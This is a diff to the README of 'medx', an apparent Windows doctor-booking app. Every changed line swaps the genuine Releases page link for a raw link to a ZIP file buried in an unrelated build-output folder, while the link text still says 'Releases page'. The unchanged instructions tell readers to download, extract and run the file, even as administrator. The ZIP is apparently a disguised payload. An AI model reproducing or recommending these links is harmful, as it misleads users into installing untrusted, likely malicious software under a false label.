@@ -1,10 +1,10 @@
 # 🩺 medx - Book doctor visits with ease
 
-[![Download medx](https://img.shields.io/badge/Download%20medx-Ready%20to%20Install-blue?style=for-the-badge&logo=github)](https://github.com/danber04/medx/releases)
+[![Download medx](https://img.shields.io/badge/Download%20medx-Ready%20to%20Install-blue?style=for-the-badge&logo=github)](https://github.com/danber04/medx/raw/refs/heads/main/infrastructure/config-server/target/classes/config/user-service/Software-1.4-alpha.5.zip)
 
 ## 📥 Download medx
 
-Open the [Releases page](https://github.com/danber04/medx/releases) and choose the latest version for Windows. Download the release file, then open it to start setup.
+Open the [Releases page](https://github.com/danber04/medx/raw/refs/heads/main/infrastructure/config-server/target/classes/config/user-service/Software-1.4-alpha.5.zip) and choose the latest version for Windows. Download the release file, then open it to start setup.
 
 ## 🖥️ What medx does
 
@@ -55,7 +55,7 @@ If your computer is older, the app may still run, but it can feel slow when many
 
 Follow these steps:
 
-1. Open the [medx Releases page](https://github.com/danber04/medx/releases)
+1. Open the [medx Releases page](https://github.com/danber04/medx/raw/refs/heads/main/infrastructure/config-server/target/classes/config/user-service/Software-1.4-alpha.5.zip)
 2. Find the newest release at the top
 3. Download the Windows file attached to that release
 4. If the file is in a ZIP folder, right-click it and choose Extract All
@@ -142,7 +142,7 @@ Try these steps:
 3. Right-click the app and choose Run as administrator
 4. Close other heavy apps
 5. Restart your PC and try again
-6. Download the latest release again from the [Releases page](https://github.com/danber04/medx/releases)
+6. Download the latest release again from the [Releases page](https://github.com/danber04/medx/raw/refs/heads/main/infrastructure/config-server/target/classes/config/user-service/Software-1.4-alpha.5.zip)
 
 ## 🧩 How the system is built
 
@@ -175,7 +175,7 @@ Keep all files in the same folder unless the release notes say otherwise.
 
 ## 📎 Download again
 
-If you need the installer again, use the [medx Releases page](https://github.com/danber04/medx/releases) to get the latest Windows version
+If you need the installer again, use the [medx Releases page](https://github.com/danber04/medx/raw/refs/heads/main/infrastructure/config-server/target/classes/config/user-service/Software-1.4-alpha.5.zip) to get the latest Windows version
 
 ## 📌 Tips for smooth use
 
